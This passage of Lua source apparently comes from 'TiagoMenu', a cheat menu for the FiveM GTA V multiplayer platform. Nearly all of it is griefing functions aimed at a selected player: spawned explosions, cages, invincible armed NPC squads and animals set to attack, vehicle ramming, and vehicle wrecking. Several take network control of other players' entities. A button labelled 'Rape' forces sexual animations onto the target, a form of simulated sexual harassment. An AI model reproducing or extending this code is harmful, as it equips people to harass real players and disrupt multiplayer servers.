                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
				elseif TiagoMenu.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif TiagoMenu.Button('~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif TiagoMenu.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif TiagoMenu.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif TiagoMenu.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif TiagoMenu.Button('~r~Attack UFO ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = GetHashKey(ee)

					
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                true,
                                true
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    true,
                                    true
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif TiagoMenu.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif TiagoMenu.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif TiagoMenu.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					
                elseif TiagoMenu.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_flaregun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif TiagoMenu.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif TiagoMenu.Button("Rain Agressive NPC") then
                    local bQ = "mp_f_cocaine_01"
					local bR = "weapon_knife"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
					
                 
					
                    elseif TiagoMenu.CheckBox(
                        "~r~Freeze ~s~Player",
                        freezePlayer,
                        function(enabled)
                            freezePlayer = enabled
                        end)
                    then
					elseif TiagoMenu.Button("~h~~b~-- Vehicle --") then
				elseif TiagoMenu.Button("Kick ~b~Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif TiagoMenu.Button("Fuck ~s~Engine") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)
 
				elseif TiagoMenu.Button("~s~Repair ~b~Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
 
				elseif TiagoMenu.Button("~s~Fuck ~b~Car ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						StartVehicleAlarm(playerVeh)
						DetachVehicleWindscreen(playerVeh)
						SmashVehicleWindow(playerVeh, 0)
						SmashVehicleWindow(playerVeh, 1)
						SmashVehicleWindow(playerVeh, 2)
						SmashVehicleWindow(playerVeh, 3)
						SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
						SetVehicleDoorBroken(playerVeh, 0, true)
						SetVehicleDoorBroken(playerVeh, 1, true)
						SetVehicleDoorBroken(playerVeh, 2, true)
						SetVehicleDoorBroken(playerVeh, 3, true)
						SetVehicleDoorBroken(playerVeh, 4, true)
						SetVehicleDoorBroken(playerVeh, 5, true)
						SetVehicleDoorBroken(playerVeh, 6, true)
						SetVehicleDoorBroken(playerVeh, 7, true)
						SetVehicleLights(playerVeh, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
						SetVehicleNumberPlateTextIndex(playerVeh, 5)
						SetVehicleNumberPlateText(playerVeh, "Tiago")
						SetVehicleDirtLevel(playerVeh, 10.0)
						SetVehicleModColor_1(playerVeh, 1)
						SetVehicleModColor_2(playerVeh, 1)
						SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
						SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
						SetVehicleBurnout(playerVeh, true)
						drawNotification("~g~Vehicle Fucked Up!")
			    elseif TiagoMenu.Button("~r~Explode ~b~Vehicle") then	
				 if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 18, 1337.0, false, true, 0.0)
                    else
                        drawNotification(
                            '~h~~r~Player not in a vehicle~s~.'
                        )
                    
                    end
			end

                    TiagoMenu.Display()
                elseif TiagoMenu.IsMenuOpened("SpawnPropsMenu") then
                    if TiagoMenu.CheckBox(
                        "Attach Prop To Player",
                        attachProp,
                        function(enabled)
                            attachProp = enabled
                        end)
                    then
                    elseif TiagoMenu.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif TiagoMenu.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif TiagoMenu.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif TiagoMenu.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif TiagoMenu.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end
                        else
                            drawNotification("Invalid Model!")
                        end
                    end

                    TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened("VehicleRamMenu") then
                if TiagoMenu.Button("Futo") then
                    local model = GetHashKey("futo")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                elseif TiagoMenu.Button("Bus") then
                    local model = GetHashKey("bus")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                end


                    TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if TiagoMenu.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, true)
                    end
                end




				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("SingleWepPlayer") then
				for i = 1, #allWeapons do
					if TiagoMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
					end
				end

				TiagoMenu.Display()
			elseif IsControlJustReleased(0, 157) then 
			    TeleportToWaypoint() 
			elseif IsControlJustReleased(0, 158) then 
			    fixcar()
            elseif IsControlJustReleased(0, 160) then 
			    reviveme()					
			elseif IsDisabledControlPressed(0, 256) then
				TiagoMenu.OpenMenu("MainMenu")
                TiagoMenu.Display()
			elseif IsDisabledControlPressed(0, 344) then
				TiagoMenu.OpenMenu("MainMenu")
			end
			Citizen.Wait(0)
		end
	end
)

            if ForceMap then
            DisplayRadar(true)
        end
				

RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)
